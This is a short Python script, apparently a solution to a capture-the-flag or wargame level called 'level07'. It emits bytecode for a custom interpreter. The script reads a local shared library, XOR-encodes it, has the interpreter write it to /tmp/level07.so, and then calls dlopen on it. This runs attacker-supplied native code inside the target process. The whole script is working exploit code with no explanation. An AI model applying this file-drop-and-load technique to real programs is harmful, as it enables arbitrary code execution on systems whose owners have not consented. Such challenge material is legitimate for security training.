#!/usr/bin/env python
from struct import *
import sys

def writestack(fourbytes):
	sys.stdout.write("\xAF\x00\x00"+fourbytes)

def dlopen():
	sys.stdout.write("\x4D\x00\x00")

def dlsym():
	sys.stdout.write("\xB4\x00\x00")

def sub():
	sys.stdout.write("\x46\x00\x00")

def writenull():
	sys.stdout.write("\x31\x00\x00")

def loopin():
	sys.stdout.write("\x18\x00\x00")

def writefile():
	sys.stdout.write("\x23\x00\x00")

def writemem():
	sys.stdout.write("\xB0\x00\x00")

def unregister():
	sys.stdout.write("\x95\x00\x00")

def writeheap(string):
	sys.stdout.write("\xEA" + pack("<H", len(string)) + string)

def encode(content):
	c = list(content)
	for i in xrange(len(content)):
		c[i] = chr(ord(c[i]) ^ 0xa5)
	return "".join(c)


with open("level07.so", mode='rb') as file:
		content = file.read(8192)


writeheap("/tmp/level07.so")
writeheap(encode(content))
writestack(pack("<I", len(content)))
writefile()
writeheap("/tmp/level07.so")
dlopen()
